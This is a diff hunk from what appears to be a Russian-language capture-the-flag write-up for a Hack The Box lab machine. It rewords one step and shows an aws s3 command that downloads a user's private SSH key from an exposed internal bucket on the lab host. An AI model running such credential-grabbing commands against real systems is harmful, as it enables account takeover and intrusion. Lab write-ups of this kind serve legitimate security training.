@@ -121,7 +121,7 @@ PRE .ssh/
 807 .profile
 ```
 
-Скачиваем приватный ключ и `authorized_keys` из `.ssh`:
+Скачиваем приватный ключ из `.ssh`:
 
 ```bash
 aws --endpoint-url http://facts.htb:54321 s3 cp s3://internal/.ssh/id_ed25519 id_ed25519
